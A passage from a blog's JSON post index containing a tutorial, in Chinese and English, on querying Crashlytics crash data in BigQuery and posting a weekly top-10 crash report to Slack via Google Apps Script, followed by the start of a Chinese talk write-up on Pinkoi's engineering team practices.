\"XXXXX.heightForRow(at:tableViewWidth:)\", \"67\", \"66\" ], [ \"3ccd93daaefe80f024cc8a7d0dc20f76\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXX.tableView(_:cellForRowAt:)\", \"59\", \"59\" ], [ \"f31a6d464301980a41367b8d14f880a3\", \"XXXX.m line 46\", \"-[XXXX XXX:XXXX:]\", \"50\", \"41\" ], [ \"c149e1dfccecff848d551b501caf41cc\", \"XXXX.m line 554\", \"-[XXXX tableView:didSelectRowAtIndexPath:]\", \"48\", \"47\" ], [ \"609e79f399b1e6727222a8dc75474788\", \"Pinkoi\", \"specialized JSONDecoder.decode&lt;A&gt;(_:from:)\", \"47\", \"38\" ]]可以看到是一個二維陣列。加上轉發 Slack 的 Function：在上述程式碼下方繼續加入新 Function。function sendTop10CrashToSlack() { var iOSTop10Crashes = queryiOSTop10Crashes(); var top10Tasks = new Array(); for (var i = 0; i &lt; iOSTop10Crashes.length ; i++) { var issue_id = iOSTop10Crashes[i][0]; var issue_title = iOSTop10Crashes[i][1]; var issue_subtitle = iOSTop10Crashes[i][2]; var number_of_crashes = iOSTop10Crashes[i][3]; var number_of_impacted_user = iOSTop10Crashes[i][4]; var strip_title = issue_title.replace(/[\\&lt;|\\&gt;]/g, ''); var strip_subtitle = issue_subtitle.replace(/[\\&lt;|\\&gt;]/g, ''); top10Tasks.push(\"&lt;https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues/\"+issue_id+\"|\"+(i+1)+\". Crash: \"+number_of_crashes+\" 次 (\"+number_of_impacted_user+\"人) - \"+strip_title+\" \"+strip_subtitle+\"&gt;\"); } var messages = top10Tasks.join(\"\\n\"); var payload = { \"blocks\": [ { \"type\": \"header\", \"text\": { \"type\": \"plain_text\", \"text\": \":bug::bug::bug: iOS 近 7 天閃退問題排行榜 :bug::bug::bug:\", \"emoji\": true } }, { \"type\": \"divider\" }, { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": messages } }, { \"type\": \"divider\" }, { \"type\": \"actions\", \"elements\": [ { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"前往 Crashlytics 查看近 7 天紀錄\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-seven-days&amp;state=open&amp;type=crash&amp;tag=all\" }, { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"前往 Crashlytics 查看近 30 天紀錄\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-thirty-days&amp;state=open&amp;type=crash&amp;tag=all\" } ] }, { \"type\": \"context\", \"elements\": [ { \"type\": \"plain_text\", \"text\": \"Crash 次數及發生版本僅統計近 7 天之間數據，並非所有資料。\", \"emoji\": true } ] } ] }; var slackWebHookURL = \"https://hooks.slack.com/services/XXXXX\"; //更換成你的 in-coming webhook url UrlFetchApp.fetch(slackWebHookURL,{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })} 如果不知道怎麼取得 in-cming WebHook URL 可以參考 此篇文章 的「取得 Incoming WebHooks App URL」章節。測試＆設定排程此時你的 Google Apps Script 專案應該會有上述兩個 Function。接下來請在上方的選擇「sendTop10CrashToSlack」Function，然後點擊 Debug 或 Run 執行測試一次；因第一次執行需要完成身份驗證，所以請至少執行過一次再進行下一步。執行測試一次沒問題後，可以開始設定排程自動執行：於左方選擇鬧鐘圖案，再選擇右下方「+ Add Trigger」。第一個「Choose which function to run」(需要執行的 function 入口) 請改為 sendTop10CrashToSlack ，時間週期可依個人喜好設定。 ⚠️⚠️⚠️ 請特別注意每次查詢都會累積然後收費的，所以千萬不要亂設定；否則可能被排程自動執行搞到破產。完成範例成果圖現在起，你只要在 Slack 上就能快速追蹤當前 App 閃退問題；甚至直接在上面進行討論。App Crash-Free Users Rate？如果你想追的是 App Crash-Free Users Rate，可參考下篇「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」延伸閱讀 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,441 Total Views Last Statistics Date: 2025-08-15 | 1,354 Views on Medium." }, { "title": "Crashlytics + Big Query: Creating a More Immediate and Convenient Crash Tracking Tool", "url": "/posts/zrealm-dev/en/crashlytics-big-query-creating-a-more-immediate-and-convenient-crash-tracking-tool-e77b80cc6f89/", "categories": "ZRealm Dev.", "tags": "ios-app-development, crashlytics, firebase, bigquery, slack", "date": "2021-10-19 22:33:30 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Crashlytics + Big Query: Creating a More Immediate and Convenient Crash Tracking Too...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Crashlytics + Big Query: Creating a More Immediate and Convenient Crash Tracking ToolIntegrating Crashlytics and Big Query to automatically forward crash logs to a Slack ChannelResultsPinkoi iOS Team Actual PhotoFirst, here’s the result image: we query Crashlytics crash logs weekly; filter out the top 10 issues with the most crashes; and send the messages to the Slack Channel, making it easier for all iOS team members to quickly understand the current stability.IssuesFor app developers, the Crash-Free Rate can be considered the most important metric; the data represents the proportion of app users who did not encounter a crash. I believe that every app should aim for a Crash-Free Rate of approximately 99.9%; however, this is not realistically achievable. As long as there is code, there can be bugs, and some crash issues may be caused by underlying (Apple) or third-party SDKs. Additionally, the varying Daily Active Users (DAU) can also impact the Crash-Free Rate; the higher the DAU, the more likely it is to encounter sporadic crash issues.Since a 100% crash-free app does not exist, tracking and addressing crashes becomes very important. Besides the most common Google Firebase Crashlytics (formerly Fabric), there are other options like Bugsnag and Bugfender… I haven’t compared these tools in practice, so interested friends can research them on their own; if you use other tools, you won’t be able to utilize the content this article aims to introduce.CrashlyticsThe benefits of choosing Crashlytics include: Stability, backed by Google Free, easy and quick installation Besides crashes, it can also log error events (e.g., Decode Error) A complete Firebase suite: other services include Google Analytics, Realtime Database, Remote Config, Authentication, Cloud Messaging, Cloud Storage… As a side note: I do not recommend building a fully-fledged service using Firebase, as the costs can become very high once traffic increases… it’s a classic bait-and-switch scenario.However, Crashlytics also has many drawbacks: Crashlytics does not provide an API for querying crash data Crashlytics only retains crash logs for the past 90 days Crashlytics’ integration support and flexibility are extremely poorThe most painful aspect is the poor integration support and flexibility, combined with the lack of an API to write scripts for querying crash data; we can only rely on manual checks in Crashlytics from time to time to view crash logs and track crash issues.Integrations Supported by Crashlytics: [Email Notification] — Trending stability issues (crash issues encountered by an increasing number of users) [Slack, Email Notification] — New Fatal Issue (crash issues) [Slack, Email Notification] — New Non-Fatal Issue (non-crash issues) [Slack, Email Notification] — Velocity Alert (sudden increase in crash issues) [Slack, Email Notification] — Regression Alert (issues that were solved but reoccurred) Crashlytics to Jira issueThe content and rules of the above integrations cannot be customized.Initially, we directly used 2. New Fatal Issue to Slack or Email; if sent to Email, we would trigger subsequent processing scripts via Google Apps Script; however, this notification would flood the notification channel, as it would notify us regardless of whether the issue was significant or just a minor problem caused by user devices or iOS itself. As DAU grew, we were bombarded with these notifications daily, and only about 10% of them were truly valuable, related to errors in our code.Thus, it did not solve the problem of Crashlytics being difficult to track automatically, and we still had to spend a lot of time reviewing whether the issues were important.Crashlytics + Big QueryAfter searching around, I found this method, which is the only one provided by the official documentation; this is the trap under the guise of free offerings. I suspect that neither Crashlytics nor Analytics Events will ever provide an API for users to query data, as the official recommendation is to import data into Big Query for use, and exceeding the free storage and query limits in Big Query incurs charges. Storage: The first 10 GB per month is free. Query: The first 1 TB per month is free. (The query limit refers to the amount of data processed when executing a SELECT statement.) For more details, please refer to the Big Query pricing documentation.The setup details for Crashlytics to Big Query can be found in the official documentation, which requires enabling GCP services, binding a credit card, etc.Getting Started with Big Query to Query Crashlytics LogsOnce the import cycle for Crashlytics logs to Big Query is set up and the first import has data, we can start querying the data.First, go to the Firebase project -&gt; Crashlytics -&gt; click on the “•••” in the upper right corner -&gt; select “BigQuery dataset.”After going to GCP -&gt; Big Query, you can select “firebase_crashlytics” in the left “Explorer” -&gt; choose your Table name -&gt; “Detail” -&gt; on the right, you can view Table information, including the latest modification time, used capacity, storage duration, etc. Confirm that there is imported data available for querying.The upper tab can be switched to “SCHEMA” to view the field information of the Table or refer to the official documentation.Clicking the “Query” button in the upper right corner opens an interface with an SQL Builder for assistance (if you’re not familiar with SQL, it’s recommended to use this):Or you can directly click “COMPOSE NEW QUERY” to open a blank Query Editor:Regardless of the method, it’s the same text editor; after entering the SQL, you can automatically check the SQL syntax and the estimated query cost in the upper right corner (This query will process XXX when run.):Once you confirm the query, click “RUN” in the upper left to execute the query, and the results will be displayed in the Query results section below. ⚠️ After clicking “RUN” to execute the query, it will accumulate towards the query limit, and charges will apply; so please be careful not to run unnecessary queries.If you’re not familiar with SQL, you can first understand the basic usage and then refer to the Crashlytics official examples to modify:1. Count the number of crashes per day for the last 30 days:SELECT COUNT(DISTINCT event_id) AS number_of_crashes, FORMAT_TIMESTAMP(\"%F\", event_timestamp) AS date_of_crashesFROM `yourProjectID.firebase_crashlytics.yourTableName`GROUP BY date_of_crashesORDER BY date_of_crashes DESCLIMIT 30;2. Query the top 10 most frequent crashes in the last 7 days:SELECT DISTINCT issue_id, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user, blame_frame.file, blame_frame.lineFROM `yourProjectID.firebase_crashlytics.yourTableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(),INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY issue_id, blame_frame.file, blame_frame.lineORDER BY number_of_crashes DESCLIMIT 10; However, the data retrieved using this method may not match the order seen in Crashlytics, likely due to grouping by blame_frame.file (nullable) and blame_frame.line (nullable).3. Query the 10 devices with the most crashes in the last 7 days:SELECT device.model,COUNT(DISTINCT event_id) AS number_of_crashesFROM `yourProjectID.firebase_crashlytics.yourTableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY device.modelORDER BY number_of_crashes DESCLIMIT 10;For more examples, please refer to the official documentation. If your SQL returns no data, please first ensure that the specified conditions have Crashlytics data imported into Big Query (for example, the default SQL example queries for the day’s crash records, but the data may not have been synchronized yet); if you confirm there is data, then check if the filtering conditions are correct.Top 10 Crashlytics Issue Big Query SQLHere, we modify the official example from 2. to achieve results that match the crash issues and sorting data we see on the first page of Crashlytics.Top 10 crash issues in the last 7 days:SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `yourProjectID.firebase_crashlytics.yourTableName`WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;Comparing the results of the Top 10 crash issues in Crashlytics, they match ✅.Using Google Apps Script to Regularly Query &amp; Forward to SlackGo to the Google Apps Script homepage -&gt; log in with the same account as Big Query -&gt; click “New Project” in the upper left corner, and after opening the new project, you can rename it in the upper left corner.First, let’s complete the integration with Big Query to obtain query data:Refer to the official documentation example and insert the above Query SQL.function queryiOSTop10Crashes() { var request = { query: 'SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `firebase_crashlytics.yourTableName` WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;', useLegacySql: false }; var queryResults = BigQuery.Jobs.query(request, 'yourProjectID'); var jobId = queryResults.jobReference.jobId; // Check on status of the Query Job. var sleepTimeMs = 500; while (!queryResults.jobComplete) { Utilities.sleep(sleepTimeMs); sleepTimeMs *= 2; queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId); } // Get all the rows of results. var rows = queryResults.rows; while (queryResults.pageToken) { queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId, { pageToken: queryResults.pageToken }); Logger.log(queryResults.rows); rows = rows.concat(queryResults.rows); } var data = new Array(rows.length); for (var i = 0; i &lt; rows.length; i++) { var cols = rows[i].f; data[i] = new Array(cols.length); for (var j = 0; j &lt; cols.length; j++) { data[i][j] = cols[j].v; } } return data}query: The query can be replaced with any SQL you have written.The structure of the returned object is as follows:[ [ \"67583e77da3b9b9d3bd8feffeb13c8d0\", \"&lt;compiler-generated&gt; line 2147483647\", \"specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)\", \"417\", \"355\" ], [ \"a590d76bc71fd2f88132845af5455c12\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"259\", \"207\" ], [ \"d7c3b750c3e5587c91119c72f9f6514d\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"138\", \"118\" ], [ \"5bab14b8f8b88c296354cd2e\", \"CoreFoundation\", \"-[NSCache init]\", \"131\", \"117\" ], [ \"c6ce52f4771294f9abaefe5c596b3433\", \"XXX.m line 975\", \"-[XXXX scrollToMessageBottom]\", \"85\", \"57\" ], [ \"712765cb58d97d253ec9cc3f4b579fe1\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXXX.heightForRow(at:tableViewWidth:)\", \"67\", \"66\" ], [ \"3ccd93daaefe80f024cc8a7d0dc20f76\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXX.tableView(_:cellForRowAt:)\", \"59\", \"59\" ], [ \"f31a6d464301980a41367b8d14f880a3\", \"XXXX.m line 46\", \"-[XXXX XXX:XXXX:]\", \"50\", \"41\" ], [ \"c149e1dfccecff848d551b501caf41cc\", \"XXXX.m line 554\", \"-[XXXX tableView:didSelectRowAtIndexPath:]\", \"48\", \"47\" ], [ \"609e79f399b1e6727222a8dc75474788\", \"Pinkoi\", \"specialized JSONDecoder.decode&lt;A&gt;(_:from:)\", \"47\", \"38\" ]]You can see it is a two-dimensional array.Adding the Function to Forward to Slack:Continue to add a new function below the above code.function sendTop10CrashToSlack() { var iOSTop10Crashes = queryiOSTop10Crashes(); var top10Tasks = new Array(); for (var i = 0; i &lt; iOSTop10Crashes.length ; i++) { var issue_id = iOSTop10Crashes[i][0]; var issue_title = iOSTop10Crashes[i][1]; var issue_subtitle = iOSTop10Crashes[i][2]; var number_of_crashes = iOSTop10Crashes[i][3]; var number_of_impacted_user = iOSTop10Crashes[i][4]; var strip_title = issue_title.replace(/[\\&lt;|\\&gt;]/g, ''); var strip_subtitle = issue_subtitle.replace(/[\\&lt;|\\&gt;]/g, ''); top10Tasks.push(\"&lt;https://console.firebase.google.com/u/1/project/yourProjectID/crashlytics/app/yourProjectID/issues/\"+issue_id+\"|\"+(i+1)+\". Crash: \"+number_of_crashes+\" times (\"+number_of_impacted_user+\" users) - \"+strip_title+\" \"+strip_subtitle+\"&gt;\"); }var messages = top10Tasks.join(\"\\n\");var payload = { \"blocks\": [ { \"type\": \"header\", \"text\": { \"type\": \"plain_text\", \"text\": \":bug::bug::bug: iOS Last 7 Days Crash Issue Ranking :bug::bug::bug:\", \"emoji\": true } }, { \"type\": \"divider\" }, { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": messages } }, { \"type\": \"divider\" }, { \"type\": \"actions\", \"elements\": [ { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"Go to Crashlytics to view records from the last 7 days\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-seven-days&amp;state=open&amp;type=crash&amp;tag=all\" }, { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"Go to Crashlytics to view records from the last 30 days\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-thirty-days&amp;state=open&amp;type=crash&amp;tag=all\" } ] }, { \"type\": \"context\", \"elements\": [ { \"type\": \"plain_text\", \"text\": \"The number of crashes and the versions in which they occurred are only based on data from the last 7 days, not all data.\", \"emoji\": true } ] } ]};var slackWebHookURL = \"https://hooks.slack.com/services/XXXXX\"; // Replace with your incoming webhook URLUrlFetchApp.fetch(slackWebHookURL,{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload)})} If you don’t know how to obtain the incoming WebHook URL, you can refer to the section “How to Obtain Incoming WebHooks App URL” in this article.Testing &amp; SchedulingAt this point, your Google Apps Script project should have the two functions mentioned above.Next, please select the “sendTop10CrashToSlack” function from the dropdown above, and then click Debug or Run to execute the test once; since the first execution requires authentication, please run it at least once before proceeding to the next step.Once the test runs successfully, you can start setting up a schedule for automatic execution:On the left, select the clock icon, then choose the “+ Add Trigger” option in the bottom right.For the first option “Choose which function to run” (the function entry that needs to be executed), change it to sendTop10CrashToSlack, and set the time interval according to your preference. ⚠️⚠️⚠️ Please be especially careful as each query will accumulate and incur charges, so do not set it randomly; otherwise, you might end up bankrupt due to automatic scheduling.CompletionExample Result ImageFrom now on, you can quickly track current app crash issues directly on Slack; you can even discuss them right there.App Crash-Free Users Rate?If you want to track the App Crash-Free Users Rate, refer to the next article “Automatically Query App Crash-Free Users Rate with Crashlytics + Google Analytics”.Further Reading Automatically Query App Crash-Free Users Rate with Crashlytics + Google Analytics Using Python + Google Cloud Platform + Line Bot to Automate Routine Tasks Creating a Fully Automated WFH Employee Health Reporting System with Slack Using Google Apps Script to Forward Gmail Messages to SlackIf you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,441 Total Views Last Statistics Date: 2025-08-15 | 1,354 Views on Medium." }, { "title": "2021 Pinkoi Tech Career Talk —  高效率工程團隊大解密", "url": "/posts/pinkoi-engineering/2021-pinkoi-tech-career-talk-%E9%AB%98%E6%95%88%E7%8E%87%E5%B7%A5%E7%A8%8B%E5%9C%98%E9%9A%8A%E5%A4%A7%E8%A7%A3%E5%AF%86-11f6c8568154/", "categories": "Pinkoi Engineering", "tags": "pinkoi, automation, ios-app-development, engineering-mangement, workflow", "date": "2021-09-09 20:13:53 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密Pinkoi 高效率工程團隊大解密 Tech Talk 分享高效率工程團隊大解密2021/09/08 19:00 @ Pinkoi x Your...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密Pinkoi 高效率工程團隊大解密 Tech Talk 分享高效率工程團隊大解密2021/09/08 19:00 @ Pinkoi x YouratorMy Medium： ZhgChgLi關於團隊Pinkoi 的工作方式是由多個 Squad (小隊)組成： Buyer-Squad ：主攻買家端功能 Seller-Squad ：主攻設計師端功能 Exploring-Squad：主攻瀏覽探索 Ad-Squad：主攻平台廣告 Out-Of-Squad：主要做支援、Infra 或 流程優化每個 Squad 會由各 Function 隊友共同組成，有 PM、Product Designer、Data、Frontend、Backend、iOS、Android…等等；長期、持續性的工作目標都會由 Squad 來完成。除了 Squad 之外也會有些跨團隊 Run 的 Project，多半時中短期的工作目標，可以是發起人或任何職務的隊友擔任 Project Owner，任務完成後即 Close。 文末還有 關於 Pinkoi 的文化是如何支持隊友解決問題 ，如果 對實際做了什麼內容不感興趣的朋友，可直接到頁底查看此章節 。人數規模與效率關係人數規模成長跟工作效率的關係，待過 10 個人的新創到百人的團隊（還沒挑戰過千人）但是光從 10 跳到 100，10 倍的差距在很多事上就很有感了。人少，溝通跟處理事情都很快，走過去討論好，等下就可以馬上給你了；因為「人與人的連結」相當強烈，彼此都能同步協作。但在人多的情況，很難這樣直接溝通，因為一起協作的人變多了，每個都走去講一整個上午就沒了；還有大家互相協作的人也很多，事情只能排優先順序來處理，不是緊急的事不可能馬上給你，這時候就要非同步的等待，去做其他事情。更多職務的人加入，可以讓工作分工更細緻專業、提供更多產能或更好的品質、更快的產出。但如同開頭說的，相對的；會有更多與人的協作，協作相對的就是會有更多溝通時間。還有小問題會被加倍放大，例如本來 1 個人每天都需要花 10 分鐘貼報表，可以接受；但現在假設變 20 個人，乘下來每天都要多花 3 個多小時貼報表；這時候貼報表這件事的優化、自動化就會很有價值，每天省 3 小時，一年工作日抓 250 天，就要多浪費 750 小時。人數規模成長，以 App Team 為例，會有比較密切協作的有這些職務。Backend — API、Product Designer — UI 這不用講，Pinkoi 是國際級的產品所以在功能上的文字都需要 Localization Team 幫我們翻譯，還有因為我們有 Data Team 在做資料搜集分析，所以除了開發功能，還需要與 Data Team 討論事件埋設點。Customer Service 也是會經常與我們有互動關係的 Team，除了使用者有時會直接透過商城評價反應訂單問題，更多的時候是使用者直接留下一顆星說遇到問題，這時候也需要請客服團隊幫忙做深入的詢問，是遇到什麼問題？我們怎麼幫助你？有以上那麼多的協作關係，意味著很多溝通機會。 但要記得，我們不是在逃避或是盡可能減少溝通，優秀的工程師溝通能力也很重要。我們要做的事是聚焦在重要的溝通上，如創意發想、需求內容跟時程的討論；不要浪費時間在重複問題的確認，或發散模糊的溝通，你問我問我他的情況也要避免。尤其疫情時代，溝通時間寶貴，要放在更有價值的討論上。「我以為你以為的我以為的以為」 — 這句話完美詮釋了模糊溝通的後果。不要說工作了，日常生活上我們也很常會遇到因為雙方認知不同導致的誤會，生活上輕鬆自在靠的是彼此的默契；但工作上就不行了，雙方認知不同如果沒深入討論，很容易到產出階段才發現怎麼跟想的都不一樣。介面溝通這邊引入的想法是透過一個共識的介面來做溝通，就類似我們工程物件導向程式設計中， SOLID 原則裡的 依賴反轉原則 Dependency inversion principle (不懂也沒關係)；在溝通上也能應用相同的概念。第一步是找出什麼地方是模糊的、每次都要重複確認的溝通，或是需要什麼溝通才能更聚焦有效，甚至只需要這個交付就不需要額外溝通的事。找出問題後就能定義出「介面」，介面就是媒介的意思，可以是一份問件、流程、check list 或工具…等等使用這個「介面」作為彼此溝通的橋樑，介面可以有多個，什麼場景就用什麼介面；遇到相同場景優先使用這個介面來做初步溝通；如果還有需求要溝通，可以基於這個介面深入聚焦的討論問題。App Team 與外部協作關係以下以 App Team 協作為例舉 4 個介面溝通的例子：第一個是與 Backend 協作在沒有任何介面共識前可能會有上圖情況。對於 API 怎麼用，如果單純地將 API Response String 給 App Team 容易有模糊地帶，例如 date 我們怎們知道是 Register Date? 還是 Birthday?，還有範圍很廣，很多欄位需要確認。這個溝通也是重複的，每次有新的 Endpoint 都要再確認一次。這就是很經典的無效溝通案例。App 與 Backend 彼此缺少的就是一個溝通介面，Solution 有很多種，也不一定要用工具；可以只是一份人工維護的文件。這塊 2020 Pinkoi 開發者之夜有跟大家分享過 — by TokiPinkoi 使用的是 Python (FastAPI) 從 API Code 自動產生文件，PHP 可以用 Swagger (之前公司做法)；優點是文件的大框架、資料格式都能從 Code 自動產生出來，降低維護成本，只需處理好欄位說明即可。p.s. 目前新的 Python 3 都會使用 FastAPI，舊的部分會逐步更新，暫時先用 PostMan 做為溝通介面。第二個是與 Product Designer 的協作，其實道理上與 Backend 類似，只是問題換成是確認 UI Spec、確認 Flow。色碼、字型如果零散，我們 App 也會很痛苦，撇開需求本來就是這樣，我們不想要有同個 Title 有明明顏色一樣但色碼跑掉或同個位置 UI 不統一的狀況。Solution 最基本的就是要先請設計大大整理好 UI 的元件庫、建立好 Design System (Guideline)，並在出 UI 時做好標記。我們在 Code Base 上根據 Design System (Guideline) 去建立相應的 Font、Color、根據元件庫建立出 Button、View。套版的時候統一使用這些已建立好的元件來套版，方便我們直接看 UI 設計稿就能快速對齊。 但這個很容易亂掉，要動態的調整；不能涵蓋太多特例，也不能固守都不擴充。p.s. 在 Pinkoi 與 Product Designer 的協作是互相的，Developer 也能提出更好的做法與 Product Designer 討論。第三個是和 Customer Service 的介面，商城的評價對產品很重要但他卻是一個非常人工跟重複轉介溝通的事。因為要時不時人工上去看一下新評價，如過有客服問題再將問題轉發給客服協助處理，很重複、人工。這個最佳解就是讓商城評價能自動同步到我們的工作平台，可以花 $ 買現有的服務，或是用我開發的 ZhgChgLi / ZReviewTender (2022 新)。 部署方式、教學及技術細節可參考： ZReviewTender — 免費開源的 App Reviews 監控機器人這個機器人就是我們的溝通介面，他會將評價自動轉發到 Slack Channel，大家能快速收到最新評價資訊，並在上面追蹤、溝通討論。最後一個例子，是與 Localization Team 的工作依賴；不管是新功能或修改舊翻譯，都需要等 Localization Team 完成工作交給我們後續協助處理。這個自行開發工具的成本太高，所以直接使用第三方服務來協助我們解除依賴關係。所有翻譯、Key 都由第三方工具管理，我們只要事先定好 Key 就能分頭行動，雙方只要在 Deadline 打包前完成工作即可，不用互相依賴；Localization Team 完成翻譯後，工具會自動觸發 git pull 更新最新的文字檔到專案內。p.s Pinkoi 因很早期就有這流程，當時選用的是 Onesky 不過這幾年有更多優秀的工具可用，可以參考採用其他的。App Team 團隊內互相協作關係剛說的是外部，現在來說內部。在人少或是說一個開發者維護一個專案的時候；你想做什麼就做什麼，你對專案的掌握度、了解程度都很高，問題不大；當然你如果有好的 Sense 就算是一人專案也能做到這邊要提的所有事。但在互相協作的隊友越來越多的情況下，大家都在同個專案底下做事，如果還是各做各的將會是場災難。例如打 API 一下這邊這樣做一下那邊那樣做、很常重造輪子浪費時間或什麼都不 Care 直接隨便弄一弄上線，都會對未來的維護跟可擴充性增加巨大的成本。團隊內與其說是介面，我覺得太見外了；應該要說共識、共鳴更有團隊意識感。最基本的老生常談就是 Coding Style，命名的習慣、位置怎麼放、Delegate 怎麼用…之類；可以以入業界常用的 realm / SwiftLint 進行約束，多國語系語句可以用 freshOS / Localize 整理 (當然，如果你已經是用前文提到的統一由第三方工具管理，就可以不用這個)。第二個是 App 架構，不管是 MVC/MVVM/VIPER/Clean Architecture 都可以，核心重點是乾淨、統一；不用追求一定要潮，統一就好。 Pinkoi App Team 使用的 Clean Architecture 。 之前在 StreetVoice 只是純 MVC 但是是乾淨統一的，協作起來也很順暢。還有 UnitTest，人多很難避免你現在做的邏輯哪一天不小心被改壞；有多寫測試能多一份保障。最後就是文件的部分，關於團隊做事的流程、規格或操作手冊，方便隊友忘記的時候快速翻閱、新人快速上手。除了 Code Level 的介面之外，協作上還有其他介面協助我們提高效率。第一是在需求實作前有一個 Request for comments 的階段，負責開發的人大概說明一下這個需求會怎麼做，然後其他人可以留意見想法。除了可以防止重造輪子之外，還可以集思廣益，例如之後其他人要擴充別人要怎麼用、或日後可能有什麼需求可以列入考量…等等，當局者迷旁觀者清啊。第二是做好 Code Review，把關我們的介面共識有沒有落實，例如：Naming 方式、UI Layout 方法、Delegate 用法、Protocol/Class 宣告…等等還有架構有沒有亂用或趕時間亂寫、發展方向假設要朝全面 Swift 發展，有沒有還在送 OC 的 Code…等等主要是 Review 這些，其次才是功能正不正常…之類的協助。p.s. RFC 的目的是提升工作效率，所以不應該太冗長，甚至嚴重拖累工作進度；可以想成單純的開工前討論環節。統整一下團隊內介面共識的功能，最後提到一個 墜機理論 的 Mindset 我覺得是個不錯的行為基準點。摘錄自 MBA 智庫運用在團隊上就是假設今天所有人都突然消失了，現存的 Code、流程、制度能不能讓新的人快速上手？Recap 介面意義，團隊內的介面是用來增加彼此的共識，團隊外的協作是降低彼此的無效溝通，用介面作為溝通沒截，專注於需求討論。再次重申「介面溝通」不是什麼特別的專有名詞或是工具、工程的東西，他只是個概念，適用於任何職務場景的協作，可以單純只是份文件或流程，順序上要先有這個東西然後才來溝通。這邊假設每次多花的溝通時間是 10 分，團隊 60 人，每個月發生 10 次，一年就浪費了 1,200 小時在無謂的溝通上。提升效率 — 自動化重複性工作第二章節想要跟大家分享一下關於自動化重複工作對於提升工作效率的效果，一樣會以 iOS 為例，但 Android 也是相同的方式。不會提到技術實作細節，單講原理上的可行性。整理一下我們有用到的服務，包括但不限於： Slack：溝通軟體 Fastlane：iOS 自動化腳本工具 Github：Git Provider Github Action：Github 的 CI/CD 服務，後面會介紹 Firebase：Crashlytics、Event、App Distribution (後面會介紹)、Remote Config… Google Apps Script：Google Apps 的外掛腳本程式，後面會介紹 Bitrise：CI/CD Server Onesky：前面有說到，Localization 的第三方工具 Testflight：iOS App 內測平台 Google Calendar：Google 行事曆，後面會介紹用在哪 Asana：專案管理工具釋出測試版的問題第一個要說的重複性問題，是當我們 App 在開發階段想要給其他隊友搶先測試的時候，傳統就是直接借手機來 Build；如果只有 1~2 人問題不大，但是團隊有 20~30 人要測，光幫忙安裝測試版那天就不用工作了，而且若有更新，整個就都要重新來過。另一個方法是使用 TestFlight 作為測試版發布媒介，我覺得也不錯；但有兩個問題，第一個是 Testflight 等同 Production 環境，不是 Debug；第二是當同時開發的需求、同事要測不同需求的隊友很多，Testflight 就會大亂，包版的 Build 也會狂改，但也不是不行。在 Pinkoi 的解法是，首先將「由 App Team 來安裝測試版」這件事拆開，用 Slack WorkFlow 做為 Input UI 